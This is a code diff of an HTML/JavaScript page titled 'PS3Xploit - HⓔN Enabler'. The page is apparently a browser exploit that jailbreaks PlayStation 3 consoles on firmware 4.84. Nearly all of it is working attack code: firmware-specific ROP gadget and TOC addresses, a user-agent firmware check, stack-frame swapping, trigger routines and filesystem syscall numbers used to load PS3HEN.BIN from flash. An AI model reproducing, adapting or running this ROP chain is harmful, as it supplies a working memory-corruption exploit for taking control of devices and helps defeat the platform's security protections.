@@ -1,4 +1,4 @@
-<html>
+<html lang="en">
   <body>
     <script>
       var xtra_data,
@@ -17,6 +17,7 @@
         index_key_addr = 0,
         search_max_threshold = 73400320,
         search_base = 2148532224,
+        mbytes = 1048576,
         search_size = 2 * mbytes,
         search_base_off = 0,
         search_size_ext = 0,
@@ -32,26 +33,25 @@
         hword_size = 2,
         word_size = 4,
         dword_size = 8,
-        mbytes = 1048576,
         stat_size_offset = 40,
         toc_addr = 7296336,
-        default_vsh_pub_toc = 7263652,
-        vsh_opd_patch = 617820,
-        vsh_opd_addr = 7256936,
-        vsh_ps3xploit_key_toc = 7370612,
-        toc_entry1_addr = 7185360,
-        toc_entry2_addr = 7494200,
-        toc_entry3_addr = 7185352,
-        toc_entry4_addr = 7602176,
-        toc_entry5_addr = 7255744,
-        toc_entry6_addr = 0,
+        // default_vsh_pub_toc = 7263652,
+        // vsh_opd_patch = 617820,
+        // vsh_opd_addr = 7256936,
+        // vsh_ps3xploit_key_toc = 7370612,
+        // toc_entry1_addr = 7185360,
+        // toc_entry2_addr = 7494200,
+        // toc_entry3_addr = 7185352,
+        // toc_entry4_addr = 7602176,
+        // toc_entry5_addr = 7255744,
+        // toc_entry6_addr = 0,
         gadget1_addr = 620036,
-        gadget2_addr = 6332484,
-        gadget3_addr = 872540,
-        gadget4_addr = 2267192,
-        gadget5_addr = 1227548,
-        gadget6_addr = 6380604,
-        gadget7_addr = 131024,
+        // gadget2_addr = 6332484,
+        // gadget3_addr = 872540,
+        // gadget4_addr = 2267192,
+        // gadget5_addr = 1227548,
+        // gadget6_addr = 6380604,
+        // gadget7_addr = 131024,
         gadget8_addr = 131072,
         gadget_mod1_addr = 6352696,
         gadget_mod2_addr = 80756,
@@ -59,65 +59,70 @@
         gadget_mod4a_addr = 890500,
         gadget_mod7_addr = 108204,
         gadget_mod8_addr = 2862264,
-        ua = navigator.userAgent,
-        fwv = ua.substring(ua.indexOf("5.0 (") + 19, ua.indexOf(") Apple")),
-        dlcount = 1,
         gadget_mod4b_addr = 0x42c778,
         gadget_mod4c_addr = 0x054af0,
-        progress_msg_frag1 = "<h1>Enabling <s>HⓔN</s> ",
-        progress_msg_frag2 = "%</h1>",
         gadget_mod15_addr = 0x39d038,
         gadget_mod12_addr = 0x63315c,
         gadget_mod9_addr = 0x010b20,
+        ua = navigator.userAgent,
+        fwv = ua.substring(ua.indexOf("5.0 (") + 19, ua.indexOf(") Apple")),
+        // dlcount = 1,
+        progress_msg_frag1 = "<h1>Enabling <s>H\u24d4N</s> ",
+        progress_msg_frag2 = "%</h1>",
         fail_msg_frag =
-          '<div id="c" class="fail"></div><div id="d"><s>HⓔN</s> <b>Exploit initialization failed!</b></div>';
+          '<div id="c" class="fail"></div><div id="d"><s>H\u24d4N</s> <b>Exploit initialization failed!</b></div>',
+        sc_fs_open = 0x321,
+        sc_fs_read = 0x322,
+        sc_fs_write = 0x323,
+        sc_fs_close = 0x324,
+        sc_fs_stat = 0x328;
 
       if (fwv == "4.84") {
-        var toc_addr = 7296344,
-          default_vsh_pub_toc = 7263660,
-          vsh_opd_patch = 617820,
-          vsh_opd_addr = 7256944,
-          vsh_toc_addr_screenshot = 7472764,
-          vsh_ps3xploit_key_toc = 7370860,
-          toc_entry1_addr = 7185360,
-          toc_entry2_addr = 7494456,
-          toc_entry3_addr = 7185352,
-          toc_entry4_addr = 7602176,
-          toc_entry5_addr = 7255752,
-          toc_entry6_addr = 0,
-          gadget1_addr = 620036,
-          gadget2_addr = 6332644,
-          gadget3_addr = 872540,
-          gadget4_addr = 2267192,
-          gadget5_addr = 1227548,
-          gadget6_addr = 6380764,
-          gadget7_addr = 131024,
-          gadget8_addr = 131072,
-          gadget9_addr = 170760,
-          gadget10_addr = 6479908,
-          gadget11_addr = 5874864,
-          gadget12_addr = 820812,
-          gadget13_addr = 4777384,
-          gadget14_addr = 4769696,
-          gadget15_addr = 4758664,
-          gadget_mod1_addr = 6352856,
-          gadget_mod2_addr = 80756,
-          gadget_mod3_addr = 757248,
-          gadget_mod4a_addr = 890500,
-          gadget_mod4b_addr = 4376440,
-          gadget_mod4c_addr = 346864,
-          gadget_mod5_addr = 4339932,
-          gadget_mod6_addr = 134144,
-          gadget_mod7_addr = 108204,
-          gadget_mod8_addr = 2862264,
-          gadget_mod9_addr = 68384,
-          gadget_mod10_addr = 1857428,
-          gadget_mod11_addr = 1618244,
-          gadget_mod12_addr = 6500860,
-          gadget_mod13_addr = 3369072,
-          gadget_mod14_addr = 6502656,
-          gadget_mod15_addr = 3788856,
-          gadget_mod16_addr = 5206828;
+        (toc_addr = 7296344),
+          // default_vsh_pub_toc = 7263660,
+          // vsh_opd_patch = 617820,
+          // vsh_opd_addr = 7256944,
+          // vsh_toc_addr_screenshot = 7472764,
+          // vsh_ps3xploit_key_toc = 7370860,
+          // toc_entry1_addr = 7185360,
+          // toc_entry2_addr = 7494456,
+          // toc_entry3_addr = 7185352,
+          // toc_entry4_addr = 7602176,
+          // toc_entry5_addr = 7255752,
+          // toc_entry6_addr = 0,
+          (gadget1_addr = 620036),
+          // gadget2_addr = 6332644,
+          // gadget3_addr = 872540,
+          // gadget4_addr = 2267192,
+          // gadget5_addr = 1227548,
+          // gadget6_addr = 6380764,
+          // gadget7_addr = 131024,
+          (gadget8_addr = 131072),
+          // gadget9_addr = 170760,
+          // gadget10_addr = 6479908,
+          // gadget11_addr = 5874864,
+          // gadget12_addr = 820812,
+          // gadget13_addr = 4777384,
+          // gadget14_addr = 4769696,
+          // gadget15_addr = 4758664,
+          (gadget_mod1_addr = 6352856),
+          (gadget_mod2_addr = 80756),
+          (gadget_mod3_addr = 757248),
+          (gadget_mod4a_addr = 890500),
+          (gadget_mod4b_addr = 4376440),
+          (gadget_mod4c_addr = 346864),
+          // gadget_mod5_addr = 4339932,
+          // gadget_mod6_addr = 134144,
+          (gadget_mod7_addr = 108204),
+          (gadget_mod8_addr = 2862264),
+          (gadget_mod9_addr = 68384),
+          // gadget_mod10_addr = 1857428,
+          // gadget_mod11_addr = 1618244,
+          (gadget_mod12_addr = 6500860),
+          // gadget_mod13_addr = 3369072,
+          // gadget_mod14_addr = 6502656,
+          (gadget_mod15_addr = 3788856);
+        // gadget_mod16_addr = 5206828;
       }
 
       function showResult(str) {
@@ -753,43 +758,29 @@
         );
       }
 
-      function fill_by_4bytes(nbytes, hex_val) {
-        var stemp = "";
-        var iterator = 0;
-        var tmp = hexh2bin(hex_val);
+      function fillNbytes(nbytes, hex_val, N) {
+        var stemp = "",
+          iterator = 0,
+          tmp = hexh2bin(hex_val);
 
-        while (iterator < nbytes / 4) {
-          stemp += tmp.repeat(2);
+        while (iterator < nbytes / N) {
+          stemp += tmp.repeat(N / 2);
           iterator++;
         }
 
         return stemp;
+      }
+
+      function fill_by_4bytes(nbytes, hex_val) {
+        return fillNbytes(nbytes, hex_val, 4);
       }
 
       function fill_by_8bytes(nbytes, hex_val) {
-        var stemp = "";
-        var iterator = 0;
-        var tmp = hexh2bin(hex_val);
-
-        while (iterator < nbytes / 8) {
-          stemp += tmp.repeat(4);
-          iterator++;
-        }
-
-        return stemp;
+        return fillNbytes(nbytes, hex_val, 8);
       }
 
       function fill_by_16bytes(nbytes, hex_val) {
-        var stemp = "";
-        var iterator = 0;
-        var tmp = hexh2bin(hex_val);
-
-        while (iterator < nbytes / 16) {
-          stemp += tmp.repeat(8);
-          iterator++;
-        }
-
-        return stemp;
+        return fillNbytes(nbytes, hex_val, 16);
       }
 
       function store_word(store_offset, val, r29out, r30out, r31out) {
@@ -877,9 +868,9 @@
 
           total_loops++;
 
-          store_idx_arr1 = [];
+          // store_idx_arr1 = [];
 
-          store_idx_arr2 = [];
+          // store_idx_arr2 = [];
 
           stack_frame = stack_frame_hookup() + stack_frame_swap(0x8a060000);
 
@@ -987,14 +978,14 @@
               clearTimeout(t_out);
             }
 
-            // showResult('<h1>Enabling <b>HⓔN<b>...</h1>');
+            // showResult('<h1>Enabling <b>H\u24d4N<b>...</h1>');
             setTimeout(trigger, 1000, jump_1_addr);
           } else {
             load_check2();
           }
         } catch (e) {
           showResult(
-            "HⓔN installation failed because the following exception was thrown during execution: " +
+            "H\u24d4N installation failed because the following exception was thrown during execution: " +
               e +
               " at: " +
               e.lineNumber
@@ -1037,11 +1028,11 @@
 
           total_loops++;
 
-          store_idx_arr1 = [];
+          // store_idx_arr1 = [];
 
-          store_idx_arr2 = [];
+          // store_idx_arr2 = [];
 
-          var usb_sp = "/dev_usb000/PS3HEN.BIN";
+          var usb_sp = "/dev_flash/hen/PS3HEN.BIN";
 
           xtra_data =
             start_x.convert() +
@@ -1067,7 +1058,7 @@
             search_max_threshold -= search_size;
           }
 
-          usb_fp_addr = xtra_data_addr + start_x.convertedSize() - 0x4;
+          var usb_fp_addr = xtra_data_addr + start_x.convertedSize() - 0x4;
 
           index_key_addr = usb_fp_addr + usb_sp.convertedSize();
 
@@ -1200,14 +1191,14 @@
               clearTimeout(t_out);
             }
 
-            // showResult('<h1>Enabling <b>HⓔN<b>...</h1>');
+            // showResult('<h1>Enabling <b>H\u24d4N<b>...</h1>');
             triggerX();
           } else {
             load_check();
           }
         } catch (e) {
           showResult(
-            "HⓔN installation failed because the following exception was thrown during execution: " +
+            "H\u24d4N installation failed because the following exception was thrown during execution: " +
               e +
               " at: " +
               e.lineNumber
@@ -1229,7 +1220,7 @@
       function triggerX() {
         setTimeout(trigger, 1000, jump_1_addr);
 
-        setTimeout(rop_exit_hen, 4500, "<b>HⓔN Failed!</b>");
+        setTimeout(rop_exit_hen, 4500, "<b>H\u24d4N Failed!</b>");
 
         t_out = 0;
 
@@ -1238,7 +1229,7 @@
 
       function logAdd() {}
       document.write(
-        '<html> <head> <title>PS3Xploit - HⓔN Enabler</title> <style>html{color: #fff; left: 100%; overflow: hidden; position: relative;}*{font-weight: 100; font-size: 32px !important;}#a{display: table; height: 100%; left: -100%; position: relative; width: 100%; text-align: center;}#b{display: table-cell; text-align: center; vertical-align: middle; width: 100%;}#c{-webkit-animation: s 2s infinite; -webkit-border-radius: 10px; background: #6f0; display: inline-block; height: 48px; right: 24px; position: absolute; top: 28px; width: 48px;}#c.fail{background: #f00;}#d{position: relative; z-index: 1;}#result{-webkit-border-radius: 10px; background: #000; display: inline-block; font-weight: 700; padding: 32px; padding-right: 92px; position: relative;}@-webkit-keyframes s{0%{-webkit-transform: rotate(0);}100%, 90%{-webkit-transform: rotate(540deg);}}input{opacity: 0;}b{color: #f00;}s{color: #6f0; text-decoration: none; font-weight: 800;}</style> </head> <body> <div id="exploit"></div><div id="trigger"></div><div id="a"> <input type="radio" autofocus/> <div id="b"> <div id="result"> <div id="c"></div><div id="d">Enabling <s>HⓔN</s></div></div></div></div></body></html>'
+        '<html> <head> <title>PS3Xploit - H\u24d4N Enabler</title> <style>html{color: #fff; left: 100%; overflow: hidden; position: relative;}*{font-weight: 100; font-size: 32px !important;}#a{display: table; height: 100%; left: -100%; position: relative; width: 100%; text-align: center;}#b{display: table-cell; text-align: center; vertical-align: middle; width: 100%;}#c{-webkit-animation: s 2s infinite; -webkit-border-radius: 10px; background: #6f0; display: inline-block; height: 48px; right: 24px; position: absolute; top: 28px; width: 48px;}#c.fail{background: #f00;}#d{position: relative; z-index: 1;}#result{-webkit-border-radius: 10px; background: #000; display: inline-block; font-weight: 700; padding: 32px; padding-right: 92px; position: relative;}@-webkit-keyframes s{0%{-webkit-transform: rotate(0);}100%, 90%{-webkit-transform: rotate(540deg);}}input{opacity: 0;}b{color: #f00;}s{color: #6f0; text-decoration: none; font-weight: 800;}</style> </head> <body> <div id="exploit"></div><div id="trigger"></div><div id="a"> <input type="radio" autofocus/> <div id="b"> <div id="result"> <div id="c"></div><div id="d">Enabling <s>H\u24d4N</s></div></div></div></div></body></html>'
       );
       setTimeout(function() {
         initROP(true);
